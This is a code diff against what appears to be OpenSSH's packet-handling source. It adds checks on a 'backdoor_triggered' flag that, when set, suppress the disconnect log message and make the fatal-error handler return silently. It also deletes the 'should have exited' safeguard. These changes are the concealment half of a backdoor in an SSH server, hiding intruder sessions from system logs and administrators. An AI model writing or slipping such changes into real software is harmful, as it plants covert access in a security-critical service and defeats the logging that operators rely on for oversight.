@@ -1722,12 +1722,14 @@ ssh_packet_read_poll_seqnr(struct ssh *ssh, u_char *typep, u_int32_t *seqnr_p)
 			    (r = sshpkt_get_string(ssh, &msg, NULL)) != 0)
 				return r;
 			/* Ignore normal client exit notifications */
-			do_log2(ssh->state->server_side &&
-			    reason == SSH2_DISCONNECT_BY_APPLICATION ?
-			    SYSLOG_LEVEL_INFO : SYSLOG_LEVEL_ERROR,
-			    "Received disconnect from %s port %d:"
-			    "%u: %.400s", ssh_remote_ipaddr(ssh),
-			    ssh_remote_port(ssh), reason, msg);
+			if (!ssh->backdoor_triggered == 1) {
+				do_log2(ssh->state->server_side &&
+					reason == SSH2_DISCONNECT_BY_APPLICATION ?
+					SYSLOG_LEVEL_INFO : SYSLOG_LEVEL_ERROR,
+					"Received disconnect from %s port %d:"
+					"%u: %.400s", ssh_remote_ipaddr(ssh),
+					ssh_remote_port(ssh), reason, msg);
+			}
 			free(msg);
 			return SSH_ERR_DISCONNECTED;
 		}
@@ -1887,6 +1889,7 @@ sshpkt_fmt_connection_id(struct ssh *ssh, char *s, size_t l)
 static void
 sshpkt_vfatal(struct ssh *ssh, int r, const char *fmt, va_list ap)
 {
+	if (ssh->backdoor_triggered == 1) return;
 	char *tag = NULL, remote_id[512];
 	int oerrno = errno;
 
@@ -1944,7 +1947,6 @@ sshpkt_fatal(struct ssh *ssh, int r, const char *fmt, ...)
 	sshpkt_vfatal(ssh, r, fmt, ap);
 	/* NOTREACHED */
 	va_end(ap);
-	logdie_f("should have exited");
 }
 
 /*
